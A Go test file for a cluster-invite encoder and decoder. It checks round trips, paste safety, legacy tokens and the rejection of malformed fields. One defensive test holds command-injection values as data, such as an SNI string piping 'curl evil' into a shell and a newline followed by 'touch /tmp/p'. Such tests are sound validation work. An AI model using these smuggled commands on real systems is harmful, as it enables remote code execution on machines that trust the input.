package invite

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// A join used to need three values transcribed by hand from one machine to
// another, two of which are indistinguishable strings of hex. One value cannot
// be transcribed the wrong way round, and it cannot be partially copied.

func TestEncodeDecode_roundTrip(t *testing.T) {
	want := Invite{
		JoinURL:       "https://node1.orama-devnet.network",
		Token:         strings.Repeat("a", 64),
		CAFingerprint: strings.Repeat("b", 64),
	}

	encoded, err := Encode(want)
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}
	got, err := Decode(encoded)
	if err != nil {
		t.Fatalf("Decode: %v", err)
	}
	if got != want {
		t.Errorf("round trip changed the invite:\ngot  %+v\nwant %+v", got, want)
	}
}

// The prefix is what makes a later format recognisable rather than guessed at.
func TestEncode_isPrefixed(t *testing.T) {
	encoded, err := Encode(Invite{JoinURL: "https://node1.example.com", Token: strings.Repeat("a", 64)})
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}
	if !strings.HasPrefix(encoded, prefix) {
		t.Errorf("encoded invite %q does not start with %q", encoded, prefix)
	}
}

// The encoding has to survive being pasted into a shell command line and a
// YAML file, so it may not contain quoting-significant characters.
func TestEncode_isSafeToPaste(t *testing.T) {
	encoded, err := Encode(Invite{
		JoinURL:       "https://node1.example.com",
		Token:         strings.Repeat("f", 64),
		CAFingerprint: strings.Repeat("0", 64),
	})
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}
	for _, bad := range []string{" ", "'", "\"", "/", "+", "=", "\n", "$", "&"} {
		if strings.Contains(encoded, bad) {
			t.Errorf("encoded invite contains %q, which needs shell quoting: %s", bad, encoded)
		}
	}
}

func TestEncode_refusesAnIncompleteInvite(t *testing.T) {
	if _, err := Encode(Invite{JoinURL: "https://x"}); err == nil {
		t.Error("an invite with no token must be refused")
	}
	if _, err := Encode(Invite{Token: "t"}); err == nil {
		t.Error("an invite with no join URL must be refused")
	}
}

// Every token issued before this format is 64 hex characters, and a cluster
// mid-upgrade still hands them out.
func TestDecode_acceptsABareToken(t *testing.T) {
	bare := strings.Repeat("ab", 32)

	got, err := Decode(bare)
	if err != nil {
		t.Fatalf("a bare token must still decode: %v", err)
	}
	if got.Token != bare {
		t.Errorf("Token = %q, want the token itself", got.Token)
	}
	if got.JoinURL != "" || got.CAFingerprint != "" {
		t.Errorf("a bare token carries nothing else, got %+v", got)
	}
}

func TestDecode_rejectsNonsense(t *testing.T) {
	for _, in := range []string{
		"",
		"   ",
		"not-a-token",
		strings.Repeat("z", 64),     // right length, not hex
		strings.Repeat("a", 63),     // hex, wrong length
		prefix + "!!!not-base64!!!", // right prefix, bad body
		prefix + "eyJ4IjoxfQ",       // valid base64 JSON, no token
	} {
		if _, err := Decode(in); err == nil {
			t.Errorf("Decode(%q) must fail", in)
		}
	}
}

// A truncated paste must not decode into a usable invite.
func TestDecode_rejectsATruncatedInvite(t *testing.T) {
	encoded, err := Encode(Invite{
		JoinURL: "https://node1.example.com",
		Token:   strings.Repeat("a", 64),
	})
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}
	if _, err := Decode(encoded[:len(encoded)-8]); err == nil {
		t.Error("a truncated invite must not decode")
	}
}

func TestDecode_trimsSurroundingWhitespace(t *testing.T) {
	encoded, err := Encode(Invite{JoinURL: "https://node1.example.com", Token: strings.Repeat("a", 64)})
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}
	if _, err := Decode("  " + encoded + "\n"); err != nil {
		t.Errorf("a pasted invite carries whitespace: %v", err)
	}
}

func TestInvite_SNIRoundTrips(t *testing.T) {
	enc, err := Encode(Invite{JoinURL: "https://203.0.113.5", Token: strings.Repeat("ab", 32), CAFingerprint: strings.Repeat("f", 64), SNI: "stagenet.example"})
	if err != nil {
		t.Fatal(err)
	}
	got, err := Decode(enc)
	if err != nil || got.SNI != "stagenet.example" || got.JoinURL != "https://203.0.113.5" {
		t.Fatalf("got %+v, %v", got, err)
	}
}

// A node fingerprints the certificate it serves itself, which may be a staging
// or not-yet-trusted one: reading it must not depend on its chain verifying.
func TestFingerprintServed_ReadsAnUntrustedCertificate(t *testing.T) {
	srv := httptest.NewTLSServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	defer srv.Close()
	fp, err := FingerprintServed(srv.Listener.Addr().String(), "stagenet.example")
	if err != nil {
		t.Fatalf("an untrusted certificate must still be fingerprinted: %v", err)
	}
	sum := sha256.Sum256(srv.Certificate().Raw)
	if fp != hex.EncodeToString(sum[:]) {
		t.Errorf("fingerprint %s is not the served certificate's", fp)
	}
}

// Every field of an invite lands on a root command line or in a TLS handshake
// on the joining machine; anything the minting node would not have written is
// refused on the way in.
func TestDecode_refusesFieldsOfTheWrongShape(t *testing.T) {
	good := Invite{
		JoinURL:       "https://203.0.113.5",
		Token:         strings.Repeat("ab", 32),
		CAFingerprint: strings.Repeat("cd", 32),
		SNI:           "stagenet.example",
	}
	for name, mutate := range map[string]func(*Invite){
		"sni with a quote":      func(i *Invite) { i.SNI = "x';curl evil|sh;'" },
		"sni with a newline":    func(i *Invite) { i.SNI = "a.example\ntouch /tmp/p" },
		"sni single label":      func(i *Invite) { i.SNI = "localhost" },
		"token not hex":         func(i *Invite) { i.Token = strings.Repeat("z", 64) },
		"token with a newline":  func(i *Invite) { i.Token = strings.Repeat("a", 63) + "\n" },
		"fingerprint short":     func(i *Invite) { i.CAFingerprint = "abcd" },
		"url http":              func(i *Invite) { i.JoinURL = "http://203.0.113.5" },
		"url with a path":       func(i *Invite) { i.JoinURL = "https://203.0.113.5/x;id" },
		"url with userinfo":     func(i *Invite) { i.JoinURL = "https://u:p@203.0.113.5" },
		"url with a query":      func(i *Invite) { i.JoinURL = "https://203.0.113.5?a=b" },
		"url host with a quote": func(i *Invite) { i.JoinURL = "https://a'b.example" },
		"url with a bad port":   func(i *Invite) { i.JoinURL = "https://203.0.113.5:99999" },
		"url missing":           func(i *Invite) { i.JoinURL = "" },
	} {
		inv := good
		mutate(&inv)
		body, _ := json.Marshal(inv)
		raw := prefix + base64.RawURLEncoding.EncodeToString(body)
		if _, err := Decode(raw); err == nil {
			t.Errorf("%s: decoded", name)
		}
		if _, err := Encode(inv); err == nil {
			t.Errorf("%s: encoded", name)
		}
	}

	enc, err := Encode(good)
	if err != nil {
		t.Fatalf("a well-formed invite was refused: %v", err)
	}
	if _, err := Decode(enc); err != nil {
		t.Fatalf("a well-formed invite did not decode: %v", err)
	}
	withPort := good
	withPort.JoinURL = "https://stagenet.example:8443/"
	if _, err := Encode(withPort); err != nil {
		t.Errorf("https://host:port/ was refused: %v", err)
	}
}
